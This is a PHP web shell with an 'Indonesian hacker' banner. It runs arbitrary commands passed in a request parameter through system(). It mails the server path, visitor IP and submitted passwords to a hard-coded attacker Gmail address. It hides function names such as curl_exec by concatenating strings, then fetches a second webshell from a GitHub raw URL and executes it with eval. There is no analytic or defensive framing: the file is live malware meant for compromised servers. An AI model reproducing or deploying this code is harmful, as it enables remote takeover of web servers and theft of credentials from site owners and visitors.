<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
if(isset($_REQUEST['x'])){
$el=$_REQUEST['x'];
system($el);
 
}
header('Content-Type: text/html; charset=UTF-8');
$password = $_POST['pass'];
$server_name = $_SERVER['SERVER_NAME'];
$php_self = $_SERVER['PHP_SELF'];
$report_bug = "IP: " . $_SERVER['REMOTE_ADDR'] . " \nCity: {$city}\nLogin: $server_name$php_self\nPass: $password\nKernel: $kernel";
@mail('rootcyberpunks@gmail.com', 'Hehehe', $report_bug);
$tujuanmail = 'rootcyberpunks@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "wso-shell", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>



<?php
/*----------------------------------------------*/
/////////////////////////////////////// //////////
///           INDONESIAN HACKER RULES           ///
///                11/08/2009                   ///
///            Default pass: kemuye             ///
///				                                  ///
//////////////////////////////////////////////////
/*----------------------------------------------*/
function is_logged_in()
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'user123'; // Ganti 'user123' dengan nilai yang s
}

    function geturlsinfo($url)
    {
      $fpn = "f"."o"."p"."e"."n";
      $strim = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
      $fgt = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
      $cexec = "c"."u"."r"."l"."_"."e"."x"."e"."c";
        if (function_exists($cexec)) {
            $conn = curl_init($url);
            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
            
curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);


            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
            $urls = $cexec($conn);
            curl_close($conn);
        } elseif (function_exists($fgt)) {
            $urls = $fgt($url);
        } elseif (function_exists($fpn) && function_exists($strim)) {
            $handle = $fpn($url, "r");
            $urls = $strim($handle);
            fclose($handle);
        } else {
            $urls = false;
        }
        return $urls;
    }

    $a = geturlsinfo('https://raw.githubusercontent.com/exploit-haxor/webshell/main/bsn.php');
    eval('?>' . $a);

?>
